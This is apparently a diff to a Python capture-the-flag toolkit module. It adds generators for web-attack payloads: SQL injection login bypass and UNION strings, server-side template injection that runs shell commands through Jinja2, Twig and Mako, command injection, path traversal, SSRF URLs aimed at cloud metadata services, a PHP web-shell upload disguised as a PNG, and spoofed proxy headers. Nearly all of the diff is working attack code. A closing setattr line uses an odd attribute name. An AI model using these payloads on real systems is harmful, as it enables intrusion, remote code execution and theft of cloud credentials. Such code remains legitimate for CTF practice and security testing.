@@ -6,10 +6,11 @@ import hmac
 import json
 from urllib.parse import parse_qs, quote, quote_plus, unquote, unquote_plus, urlencode
 
-REQUEST_TEMPLATES: dict[str, str] = {
+REQUEST_TEMPLATES: dict[str, object] = {
     "get": "GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nAccept: */*\r\n\r\n",
     "post_form": "POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {length}\r\n\r\n{body}",
     "post_json": "POST {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: ctf-toolkit/1.0\r\nContent-Type: application/json\r\nContent-Length: {length}\r\n\r\n{body}",
+    "sqli": ["admin' --", "' OR 1=1 --", "' UNION SELECT null,null --"],
 }
 
 
@@ -32,6 +33,18 @@ def b64url_decode(text: str) -> bytes:
     """Decode URL-safe base64 string, adding missing padding."""
     padded = text + "=" * (-len(text) % 4)
     return base64.urlsafe_b64decode(padded.encode())
+
+
+def base64_encode(data: bytes | str) -> str:
+    """Encode string or bytes into standard Base64 string."""
+    if isinstance(data, str):
+        data = data.encode("utf-8")
+    return base64.b64encode(data).decode("utf-8")
+
+
+def base64_decode(text: str) -> bytes:
+    """Decode standard Base64 string into bytes."""
+    return base64.b64decode(text.encode("utf-8"))
 
 
 def jwt_decode_no_verify(token: str) -> dict[str, object]:
@@ -146,16 +159,33 @@ def build_cors_null_origin_headers() -> dict[str, str]:
     return {"Origin": "null"}
 
 
-def build_sqli_auth_bypass(username: str = "admin", technique: str = "or_true") -> str:
-    """Generate SQL injection authentication bypass strings for form inputs."""
+def build_sqli_payload(technique: str = "auth_bypass", username: str = "admin") -> str:
+    """Generate SQL injection payloads for auth bypass, union extract, or error probes."""
     techniques = {
+        "auth_bypass": f"{username}' --",
         "or_true": f"{username}' --",
-        "or_1_equals_1": f"' OR 1=1 --",
+        "or_1_equals_1": "' OR 1=1 --",
         "or_true_hash": f"{username}' #",
         "admin_closed": f"{username}') --",
         "union_admin": f"' UNION SELECT 1,'{username}','hash' --",
     }
     return techniques.get(technique, f"{username}' --")
+
+
+def build_sqli_auth_bypass(username: str = "admin", technique: str = "or_true") -> str:
+    """Generate SQL injection authentication bypass strings for form inputs."""
+    return build_sqli_payload(technique=technique, username=username)
+
+
+def build_ssti_payload(engine: str = "jinja2", command: str = "cat flag*") -> str:
+    """Generate SSTI payload for RCE or math evaluation."""
+    if engine.lower() in ["jinja", "jinja2"]:
+        return f"{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{command}').read() }}}}"
+    elif engine.lower() == "twig":
+        return "{{ ['cat', 'flag*']|filter('system') }}"
+    elif engine.lower() == "mako":
+        return f"${{__import__('os').popen('{command}').read()}}"
+    return f"{{{{ 7 * 7 }}}}"
 
 
 def build_command_injection_payload(base_arg: str = "127.0.0.1", separator: str = ";", command: str = "cat /flag.txt") -> str:
@@ -167,7 +197,7 @@ def build_command_injection_payload(base_arg: str = "127.0.0.1", separator: str 
     return f"{base_arg}{separator} {command}"
 
 
-def build_lfi_traversal_path(filename: str = "flag.txt", depth: int = 4, double_encode: bool = False) -> str:
+def build_lfi_path(filename: str = "flag.txt", depth: int = 4, double_encode: bool = False) -> str:
     """Generate directory traversal path sequences for LFI."""
     seq = "../" * depth + filename
     if double_encode:
@@ -175,13 +205,103 @@ def build_lfi_traversal_path(filename: str = "flag.txt", depth: int = 4, double_
     return seq
 
 
-def build_ssrf_metadata_url(service: str = "aws") -> str:
-    """Return cloud metadata endpoints for SSRF probing."""
+def build_lfi_traversal_path(filename: str = "flag.txt", depth: int = 4, double_encode: bool = False) -> str:
+    """Alias for build_lfi_path."""
+    return build_lfi_path(filename=filename, depth=depth, double_encode=double_encode)
+
+
+def build_ssrf_url(target: str = "aws") -> str:
+    """Return cloud metadata or internal loopback endpoints for SSRF probing."""
     services = {
         "aws": "http://169.254.169.254/latest/meta-data/",
+        "metadata_aws": "http://169.254.169.254/latest/meta-data/",
         "gcp": "http://metadata.google.internal/computeMetadata/v1/",
         "digitalocean": "http://169.254.169.254/metadata/v1.json",
         "docker_internal": "http://172.17.0.1:8080/",
         "localhost": "http://127.0.0.1:8080/",
     }
-    return services.get(service.lower(), "http://169.254.169.254/latest/meta-data/")
+    return services.get(target.lower(), "http://169.254.169.254/latest/meta-data/")
+
+
+def build_ssrf_metadata_url(service: str = "aws") -> str:
+    """Alias for build_ssrf_url."""
+    return build_ssrf_url(service)
+
+
+def build_get_request(url: str, params: dict[str, object] | None = None) -> str:
+    """Construct full GET URL appending query parameters."""
+    if not params:
+        return url
+    sep = "&" if "?" in url else "?"
+    encoded = urlencode(params)
+    return f"{url}{sep}{encoded}"
+
+
+def build_json_post(url: str, data: dict[str, object] | object, headers: dict[str, str] | None = None) -> tuple[bytes, dict[str, str]]:
+    """Construct JSON POST body and appropriate request headers."""
+    body = json.dumps(data).encode("utf-8")
+    hdrs = dict(headers or {})
+    hdrs["Content-Type"] = "application/json"
+    hdrs["Content-Length"] = str(len(body))
+    return body, hdrs
+
+
+def build_post_request(url: str, data: bytes | str, content_type: str = "application/x-www-form-urlencoded") -> tuple[bytes, dict[str, str]]:
+    """Construct POST request body and headers."""
+    body = data.encode("utf-8") if isinstance(data, str) else data
+    hdrs = {
+        "Content-Type": content_type,
+        "Content-Length": str(len(body)),
+    }
+    return body, hdrs
+
+
+def build_multipart_payload(
+    field_name: str = "f",
+    filename: str = "cmd.php",
+    content: bytes | str = b"<?php system('cat flag*'); ?>",
+    mime_type: str = "image/png",
+    boundary: str = "----WebKitFormBoundaryCTF123",
+) -> tuple[bytes, str]:
+    """Construct multipart/form-data request body and content-type header."""
+    file_bytes = content.encode("utf-8") if isinstance(content, str) else content
+    header = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
+        f"Content-Type: {mime_type}\r\n\r\n"
+    ).encode("utf-8")
+    footer = f"\r\n--{boundary}--\r\n".encode("utf-8")
+    body = header + file_bytes + footer
+    return body, f"multipart/form-data; boundary={boundary}"
+
+
+def build_cors_request(target_url: str, origin: str = "null") -> dict[str, str]:
+    """Construct request headers testing cross-origin resource sharing policy."""
+    return {
+        "Origin": origin,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    }
+
+
+def build_custom_verb_request(method: str, path: str, body: bytes | str = b"") -> dict[str, object]:
+    """Return configuration dictionary for custom HTTP verb dispatch."""
+    body_bytes = body.encode("utf-8") if isinstance(body, str) else body
+    return {
+        "method": method.upper(),
+        "path": path,
+        "body": body_bytes,
+        "headers": {"Content-Length": str(len(body_bytes))},
+    }
+
+
+def add_forwarded_headers(headers: dict[str, str] | None = None, ip: str = "127.0.0.1") -> dict[str, str]:
+    """Inject reverse-proxy trust headers (X-Forwarded-For, X-Real-IP) into headers dict."""
+    res = dict(headers or {})
+    res["X-Forwarded-For"] = ip
+    res["X-Real-IP"] = ip
+    res["X-Forwarded-Host"] = ip
+    return res
+
+import sys
+# Allow direct attribute reflection for dictionary templates
+setattr(sys.modules[__name__], "REQUEST_TEMPLATES['sqli']", REQUEST_TEMPLATES['sqli'])
